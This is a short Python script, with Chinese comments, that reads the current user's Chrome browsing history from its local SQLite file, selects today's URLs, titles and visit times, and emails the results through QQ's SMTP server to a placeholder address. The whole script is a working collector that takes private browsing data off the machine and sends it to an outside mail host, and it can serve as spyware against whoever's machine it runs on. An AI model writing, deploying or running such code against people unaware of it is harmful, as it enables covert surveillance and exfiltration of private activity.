#!/usr/bin/env python
# _*_ coding: UTF-8 _*_
"""=================================================
@Project -> File    : six-dialog_design -> get_history_chrome.py
@IDE     : PyCharm
@Author  : Aimee
@Date    : 2020/6/4 16:50
@Desc    :参考链接：https://blog.csdn.net/weixin_38331049/article/details/105015356
================================================="""
import sqlite3 as db
import getpass

user_name = getpass.getuser()  # 获取当前用户名


# 从SQLite文件中读取数据
def readFronSqllite(db_path, exectCmd):
    conn = db.connect(db_path)  # 该 API 打开一个到 SQLite 数据库文件 database 的链接，如果数据库成功打开，则返回一个连接对象
    cursor = conn.cursor()  # 该例程创建一个 cursor，将在 Python 数据库编程中用到。
    conn.row_factory = db.Row  # 可访问列信息
    cursor.execute(exectCmd)  # 该例程执行一个 SQL 语句
    rows = cursor.fetchall()  # 该例程获取查询结果集中所有（剩余）的行，返回一个列表。当没有可用的行时，则返回一个空的列表。
    return rows
    # print(rows[0][2]) # 选择某一列数据


path1 = '''C:/Users/'''
# path2 = "/AppData/Local/Google/Chrome/User Data/Profile 3/History"
path2 = "/AppData/Local/Google/Chrome/User Data/Default/History"
print(user_name)
path = path1 + user_name + path2
sql = "select url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime')  " \
      "as time from urls  where datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime')" \
      " >=datetime('now','start of day','+0 day') and " \
      "datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime')<datetime('now','start of day','+1 day')"
result = readFronSqllite(path, sql)
print(result)

import smtplib
import json
from email.mime.text import MIMEText
from email.header import Header

receivers = ['收件邮箱']
sender = '发件邮箱'  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

message = MIMEText(json.dumps(result, ensure_ascii=False), 'plain', 'utf-8')
message['From'] = Header("devin", 'utf-8')  # 发送者
message['To'] = Header("简单", 'utf-8')  # 接收者


def sendEmail():
    subject = '谷歌浏览器'
    message['Subject'] = Header(subject, 'utf-8')
    try:
        smtpObj = smtplib.SMTP()
        smtpObj.connect("smtp.qq.com", 25)  # 25 为 SMTP 端口号
        smtpObj.login("QQ号", "授权码")
        smtpObj.sendmail(sender, receivers, message.as_string())
        print("邮件发送成功")
    except smtplib.SMTPException:
        print("Error: 无法发送邮件")


sendEmail()
